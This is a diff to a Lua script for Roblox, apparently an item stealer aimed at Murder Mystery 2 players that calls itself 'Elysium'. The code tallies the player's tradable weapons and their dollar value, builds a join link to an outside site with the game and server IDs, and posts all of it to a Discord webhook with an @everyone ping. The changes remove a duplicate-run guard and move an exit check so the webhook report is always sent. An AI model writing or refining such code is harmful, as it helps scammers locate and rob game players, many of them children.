@@ -69,16 +69,7 @@ task.spawn(function()
 	end
 end)
 
-if _G.__ElysiumMM2 then
-	warn("[Elysium] already running")
-
-	return
-end
-
-_G.__ElysiumMM2 = true
 _G.LastOffer = nil
-pcall(function()
-end)
 
 local function v32(...)
 	warn("[Elysium]", ...)
@@ -1029,6 +1020,7 @@ local function v262()
 
 	return nil
 end
+
 local function v269(p24, p25)
 	local v270 = v228(u215, 20, " ➜ ")
 	local v271 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, JobId2)
@@ -1095,12 +1087,6 @@ local function v277()
 		return
 	end
 
-	if #u215 == 0 then
-		v32("No tradable weapons — kicking as bot")
-
-		return
-	end
-
 	u276 = true
 	v32("allWeaponsLog=" .. #u215 .. " weaponsToSend=" .. #u196 .. " totalAllValue=" .. n2 .. " totalAllDollar=$" .. n3)
 
@@ -1163,6 +1149,11 @@ local function v277()
 
 		v318.content = v298 and "@everyone" or ""
 		v251(WEBHOOK, v318.content, v318.embeds)
+	end
+	
+	if #u215 == 0 then
+		v32("No tradable weapons — stopping")
+		return
 	end
 end
 
